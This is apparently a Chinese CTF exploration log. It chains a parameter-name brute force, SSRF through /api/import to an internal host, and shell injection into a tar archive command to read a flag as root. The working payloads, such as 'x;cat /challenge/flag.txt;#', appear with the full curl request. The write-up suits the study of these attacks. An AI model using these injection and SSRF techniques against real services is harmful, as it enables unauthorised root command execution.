# a-14 · 探索记录

对应题解：[`a-14.md`](./a-14.md)。

## 目标与起点

题目说「物流追踪看板，集成了外部数据导入，内网诊断工具可能被外部间接访问，获取最高权限读 flag」。中等难度，300 分。

启动后是 Flask（Werkzeug 3.1.8 / Python 3.9.25）单页看板。

## 第一阶段：前端与 API

页面脚本里有四个调用：

```
GET  /api/services/status
GET  /api/tasks/recent
GET  /api/track?id=
POST /api/import   {url}
```

`/api/services/status` 直接返回内网服务清单，包括：

```json
{"name":"Log Archive Tool","status":"Restricted",
 "url":"http://admin-api:5000/api/internal/archive",
 "usage":"GET /api/internal/archive?service=web&filename={name}"}
```

**内网主机 `admin-api:5000`、两个接口、参数名都在这儿。** 这一步之后就不需要扫内网。

`/api/tasks/recent` 显示每分钟执行一次 `Log Archive / web / Success`，说明归档任务确实在跑。

## 第二阶段：`/api/track` 是桩

试了：

```
?id=PX-0001                 → 固定状态 + 回显 id
?id=PX-0001'                → 同样
?id=1 or 1=1                → 同样
?id=http://admin-api:5000/  → 同样（只是把 URL 当字符串回显）
```

**结论：`/api/track` 不做查询也不做 SSRF，只是把输入塞进 JSON 返回。** 这一支很快排除。

## 第三阶段：卡在 `/api/import` 的字段名（最久的一段）

前端代码写得很清楚：

```js
fetch('/api/import', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url})
});
```

但服务端对所有请求都返回：

```
HTTP/1.1 400
{"error":"URL is required"}
```

### 试过的字段名（全部失败）

先手试：`url`、`uri`、`link`、`target`、`endpoint`、`address`、`host`、`api`、`api_url`、`partner`、`partner_url`、`sync_url`、`source`、`src`、`value`、`query`、`input`、`path`、`fetch_url`、`tracking_url`、`URL`、`Url`。

再把 `final-params.txt`（56 439 个参数名）全跑一遍，仍然零命中。

也排除了这些「看起来可能」的变体：

| 尝试 | 结果 |
| --- | --- |
| 把 URL 放 query（`?url=...`） | 仍是 `URL is required` |
| 放 header（`X-URL`） | 同上 |
| 嵌套 `{"data":{"url":...}}` / `{"params":{"url":...}}` | 同上 |
| 表单编码 | 415（接口只接受 JSON） |
| 原始字符串 body | 400 Bad Request |
| 换 `Content-Type` 的 charset、加 `Accept`/`XHR`/`Origin` | 全部 400 |
| 把值换成 `partner-carrier.com`、`api.global-logistics.com`、`127.0.0.1`、`localhost`、`admin-api` | 全部 `URL is required` |

**这一步的错误判断**：我一度以为「服务端只做 URL 校验，内网地址被白名单拦了」。但 `https://api.global-logistics.com`（清单里明确写着的合法伙伴）也被拒，说明不是白名单，是字段名根本不对。

### 正确的做法：组合爆破字段名

字段名往往不是单词，而是「前缀_后缀」的组合。写脚本按 `前缀 × 后缀 × 分隔符` 生成 903 个候选：

```python
pre = ['url','api','partner','sync','tracking','remote','target','endpoint',
       'host','fetch','source','import','external','data','carrier','logistics','parcel']
suf = ['url','uri','address','endpoint','api','link','target','host','path','addr','service','source','value']
keys = {a + sep + b for a in pre for b in suf for sep in ('_','-','')} | {a + b.capitalize() ...}
```

第 903 个候选命中：

```json
{"target_endpoint": "http://admin-api:5000/"}
→ 200 {"data_preview":"<!doctype html>...404 Not Found...","status":"success"}
```

**字段名是 `target_endpoint`。** 它既不在前端 JS 里，也不在常见参数字典里，只能靠组合爆破或读源码。

## 第四阶段：SSRF → 内网归档接口

```bash
{"target_endpoint":"http://admin-api:5000/api/v2/fetch"}
→ {"partner_response":{"carrier":"GlobalPartner","data":{...}}}
```

确认 SSRF 可用，并且 `data_preview` 会把上游响应体带回来。

再看归档接口：

```bash
{"target_endpoint":"http://admin-api:5000/api/internal/archive?service=web&filename=access.log"}
```

返回里带着服务端拼好的命令：

```json
{"command":"tar -czf /tmp/access.log.gz /var/log/sync/web.log 2>&1",
 "output":"tar: Removing leading `/' from member names\n"}
```

**`command` 字段直接暴露了拼接位置**：`filename` 进 `/tmp/{filename}.gz`，整条交给 `/bin/sh`。

## 第五阶段：从注入到 flag

按命令行上下文设计 payload：

| payload | 结果 | 结论 |
| --- | --- | --- |
| `x;id` | `/bin/sh: 1: id.gz: not found` | `;` 生效，但 `id` 后面还跟着 `.gz` |
| `x;id;#` | `uid=0(root) ...` | `#` 注释掉尾部，干净输出 |
| `x$(id)` | `tar: gid=0(root): Cannot stat` | 命令替换执行了，但输出被 tar 按空格拆成参数 |
| `x;cat /challenge/flag.txt;#` | `flag{...}` | 读完 |

最终：

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://admin-api:5000/api/internal/archive?service=web&filename=x;cat /challenge/flag.txt;#"}' \
  http://$T/api/import
```

```json
{"output":"flag{c7913a4d-ec7c-4df8-9c4f-cd549c2b27b5}/bin/sh: 1: .gz: not found\n"}
```

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/api/track?id=` SQLi | 无 | 输入被原样回显，状态恒定 |
| `/api/track?id=<url>` SSRF | 无 | 只回显字符串 |
| `/api/import` 用 `url` 字段（照前端抄） | 400 | `URL is required` |
| 56k 参数字典盲试 | 零命中 | 字段名是复合词 |
| `/api/import` 表单编码 | 415 | 只接受 JSON |
| 头部/查询/嵌套传参 | 400 | 服务端只读 JSON 顶层字段 |
| `filename=x;id` | 部分失败 | `;` 生效但尾部 `.gz` 被当命令 |
| `filename=x$(id)` | 输出被拆词 | tar 报 `Cannot stat` |
| **`filename=x;...;#`** | **成功** | `#` 注释尾部 |

## 这次真正的收获

1. **「服务发现」接口就是内网地图。** 有它就不必扫网段，主机名、端口、路径、参数全在。
2. **前端字段名和实际后端可能不一致。** 遇到「参数缺失」时，先怀疑字段名，再怀疑白名单；用「前缀×后缀」组合爆破比跑通用参数字典有效。
3. **回显 `command` 的服务是最友好的命令注入目标。** 它把拼接结果直接打印出来，省掉猜上下文。
4. **`;` 与 `$(...)` 的取舍**：`$(...)` 的输出会被外层命令按空格拆词，适合确认执行；`; ... #` 适合取回干净的多行文本。
5. **SSRF 只是跳板。** 真正的价值在于「跳到能做命令执行的那台机器」，本题的 flag 在内网归档服务上，不在 SSRF 本身。
